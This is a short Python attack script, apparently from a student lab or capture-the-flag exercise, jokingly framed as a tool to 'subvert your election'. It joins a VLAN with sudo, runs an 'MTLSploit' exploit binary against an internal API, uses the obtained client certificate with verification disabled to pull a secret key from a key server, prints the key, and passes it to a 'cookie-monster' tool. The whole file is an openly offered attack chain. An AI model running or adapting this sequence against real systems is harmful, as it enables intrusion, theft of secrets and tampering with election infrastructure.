#!/usr/bin/python3
import os
import requests
os.system("clear")
print("".center(80,"="))
print("Welcome to Auto Elect!".center(80,"-"))
print("Is democracy too inconvenient? We've got you covered.")
print("".center(80,"="))
print("\n\n")
print("Registering interface on secure vlan...".center(80,"-"))
status = 0
status |= os.system("sudo ip link add link ens3 name ens3.10 type vlan id 10")
status |= os.system("sudo ip addr  add dev ens3.10 172.16.10.200/24")
status |= os.system("sudo ip link set dev ens3.10 up")
if status:
    print("WARNING: ip address registration failed, this might not work...")
print("Registered.\n")
print("Launching MTLSploit".center(80,"-"))
status = os.system("sudo ./exploit -d api.internal")
if status:
    raise ChildProcessError("Exploit binary failed!")
try:
    key = requests.get("https://keyserver.internal", cert=("/home/student/hack/api.internal-crt.pem","/home/student/hack/api.internal-key.pem"),verify=False).text
except(requests.exceptions.SSLError):
    raise FileNotFoundError("Certificate Verification Failed! Abort!")
print("I found the API's secret key! It's ",key)
print("\n\n")
print("Launching Cookie Monster".center(80,"-"))
os.system("./cookie-monster {}".format(key))
print("\n\nThank you for choosing us to subvert your election <3")